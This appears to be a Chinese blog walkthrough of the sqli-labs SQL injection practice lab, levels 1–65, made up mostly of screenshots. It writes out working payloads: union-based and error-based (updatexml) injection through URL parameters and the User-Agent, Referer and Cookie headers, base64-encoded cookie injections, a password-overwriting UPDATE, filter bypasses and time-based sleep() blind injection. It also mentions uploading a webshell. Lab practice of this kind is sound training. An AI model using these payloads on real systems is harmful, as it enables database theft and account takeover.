直接放图
# 有回显的地方可以插入sql语句，pyload看url
order by 找出3个字段
union select 1,2,3
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706021841358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)2,3就是显示位，可以放sql语句，--+为了注释后面语句
例如这个
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706022059865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706023030121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706023540351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
# 报错注入三种都试一下paylod里面放sql语句
![加粗样式](https://img-blog.csdnimg.cn/20200706024550245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706025026533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
第七题传个马，然后。。。。。然后我没菜刀
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706025656228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
第八题盲注 就是瞎猜（开个玩笑）通过页面是否正确返回来判断 例如

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706030217332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706030236487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
# 后面的逻辑改成sql语句盲注
第九题，显示一样，加一个sleep函数区分是否执行和第八题一样
第十题，双引号盲注，剩下的和第九题一样
第十一题，抓包改参
莫名其妙抓不了包
uname=0' union select 1,2  --+&passwd=admin&submit=Submit
第十二题，和十一题一样，单引号改双引号
uname=0") union select 1,database() --+ &passwd=admin&submit=Submit
第十三题
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706035606976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
第十四题
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706035823941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
第十五
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706040106232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
十六
sleep函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020070604040687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
十八
构造User-Agent
payload-header:User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0 ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #

十九
Referer
Referer: http://localhost/sqli-labs/Less-19/ ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #
二十
构造cookie
payload-header:Cookie: uname=admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #
# base64编码
二十一
union联查
Cookie: uname=JykgdW5pb24gc2VsZWN0IDEsMixlbWFpbF9pZCBmcm9tIGVtYWlscyAj=
二十二同上
Cookie: uname=IiB1bmlvbiBzZWxlY3QgMSwyLGVtYWlsX2lkIGZyb20gZW1haWxzICM=
二十三
由于bun掉了注释符构造or '1'='1来补全sql语句数字2是回显点
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706043224576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
二十四
任意修改
先注册然后修改
UPDATE users SET PASSWORD=’666666’ where username=’ghost’ #’ and password=’123456’
把123456改为666666
二十五
盲注双写绕过
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706044048890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
二十六
5是回显点，用%A0替代空格使用，用&&(%26%26)替代AND使用
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706044356341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
二十七
大小写绕过
二十八
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706045425769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
29
不会
# 宽字节注入 
32
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706050130886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706050245533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
35
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706050429377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
36
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706051030349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
37
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706051144323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
# 堆叠注入 
38
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706051627537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
39
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020070605175594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
40
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706051955610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
41
盲注
48
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706052540987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
49
同上加一个sleep
50
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706052808369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
51
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706052842742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
52
同50
53
同51
62
sleep
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706053254354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)
?id=1%27)and%20If(ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27),1,1))=79,0,sleep(5))--+
63同上
单引号 
64同上
双括号 
65
?id=1%22)and%20If(ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27),1,1))=79,0,sleep(10))--+
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200706053645989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70)









